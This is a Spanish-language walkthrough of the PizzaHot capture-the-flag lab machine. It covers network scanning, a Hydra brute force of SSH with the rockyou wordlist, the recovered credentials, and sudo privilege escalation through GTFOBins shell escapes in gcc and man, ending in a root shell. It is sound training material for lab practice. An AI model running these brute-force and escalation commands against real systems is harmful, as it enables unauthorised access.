# PizzaHot

Maquinas que vamos a utilizar Kali Linux y PizzaHot [https://thehackerslabs.com/pizzahot/](https://thehackerslabs.com/pizzahot/)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%20129.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=1000 -n -vvv -Pn 10.0.3.33
```

![image.png](./imagenes/image%20130.png)

- Vamos a ver lo que corre por el puerto 80 en el explorador web
    
    ![image.png](./imagenes/image%20131.png)
    
- Miramos el código base
    
    `CTRL+Z`
    
    ![image.png](./imagenes/image%20132.png)
    
    Nos encontramos un comentario curioso que puede ser una pista de un nombre de usuario **“pizzapiña”.**
    
- Probamos un ataque con Hydra a SSH con el posible usuario encontrado.
    
    ```bash
    hydra -l pizzapiña -P /usr/share/wordlists/rockyou.txt ssh://10.0.3.33
    ```
    
    ![image.png](./imagenes/image%20133.png)
    
    Tenemos el usuario y la contraseña de SSH. **login: pizzapiña   password: steven.**
    
- Probamos las credenciales de SSH.
    
    ```bash
    ssh pizzapiña@10.0.3.33 
    ```
    
    ![image.png](./imagenes/image%20134.png)
    

- Hacemos un listado de privilegios con **sudo -l**
    
    `sudo -l`
    
    ![image.png](./imagenes/image%20135.png)
    
    Vemos que el usuario pizzassinpiña tiene permisos de ejecución de gcc
    
- Utilizamos la web [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/) para ver si tiene vulnerabilidades **/usr/bin/gcc** .
    
    ![image.png](./imagenes/image%20136.png)
    
    `sudo gcc -wrapper /bin/sh,-s .`
    
    Nos quedaría así el comando:  `sudo -u pizzasinpiña /usr/bin/gcc -wrapper /bin/sh,-s .`
    

- Lo probamos
    
    `sudo -u pizzasinpiña /usr/bin/gcc -wrapper /bin/sh,-s .`
    
    `whoami`
    
    ![image.png](./imagenes/image%20137.png)
    
- Volvemos a listar privilegios **sudo -l**
    
    `sudo -l`
    
    ![image.png](./imagenes/image%20138.png)
    
- Miramos **man** en [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/)
    
    ![image.png](./imagenes/image%20139.png)
    
- Vamos a probarlo
    
    `sudo -u root man man` 
    
    `!/bin/sh`
    
    `whoami`
    
    ![image.png](./imagenes/image%20140.png)
    
    ![image.png](./imagenes/image%20141.png)
    
    ![image.png](./imagenes/image%20142.png)
  